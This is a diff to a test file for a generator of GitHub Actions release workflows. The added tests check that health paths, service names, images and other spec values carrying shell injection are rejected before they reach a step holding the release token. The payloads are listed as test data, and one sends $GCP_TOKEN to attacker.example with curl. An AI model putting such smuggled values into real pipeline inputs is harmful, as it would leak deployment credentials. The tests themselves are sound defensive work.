@@ -73,7 +73,7 @@ describe('keyless release workflow', () => {
     const release = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release web');
     expect(release.run).toContain("base + '?updateMask=template.containers'");
     expect(release.run).toContain('{ etag: current.etag, template: { containers } }');
-    expect(release.run).toContain('node release.mjs web-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} /health services');
+    expect(release.run).toContain("node release.mjs web-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} '/health' services");
   });
 
   it('builds each service from its own generated Dockerfile when the repository has none', () => {
@@ -83,5 +83,36 @@ describe('keyless release workflow', () => {
     expect(builds[0]).toContain('if [ ! -f Dockerfile ]');
     const worker = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release worker').run as string;
     expect(worker).toMatch(/node release\.mjs worker-abc .+ "" workerPools/);
+  });
+
+  // #543: spec values become shell source in steps that hold the release token.
+  describe('values that reach the release shell', () => {
+    const base = {
+      environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1',
+      provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
+      releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com',
+    };
+    const web = { name: 'web', resource: 'web-abc', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web' };
+
+    it.each(['/$(curl attacker.example -d "$GCP_TOKEN")', '/health\n          curl attacker.example', '/a;env', '/a b', '//attacker.example/x', 'https://attacker.example/x', 'health'])(
+      'refuses the health path %j', (healthPath) => {
+        expect(() => renderReleaseWorkflow({ ...base, services: [{ ...web, healthPath }] })).toThrow(/health check path/i);
+      });
+
+    it('passes an ordinary health path, with a query, as one quoted argument', () => {
+      const parsed = YAML.parse(renderReleaseWorkflow({ ...base, services: [{ ...web, healthPath: '/api/health?deep=1&x=y' }] }));
+      const release = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release web');
+      expect(release.run).toContain("node release.mjs web-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} '/api/health?deep=1&x=y' services");
+    });
+
+    it.each([
+      ['service name', { services: [{ ...web, name: 'web; curl attacker.example' }] }],
+      ['resource', { services: [{ ...web, resource: 'web-abc $(env)' }] }],
+      ['image', { services: [{ ...web, image: 'registry/x:$(env)' }] }],
+      ['release job', { services: [web], releaseCommand: { job: 'job`env`', service: 'web' } }],
+      ['environment name', { environmentName: 'staging\nenv:', services: [web] }],
+    ])('refuses a %s that is not a plain identifier', (_label, override) => {
+      expect(() => renderReleaseWorkflow({ ...base, ...override })).toThrow(/not supported in a workflow/i);
+    });
   });
 });
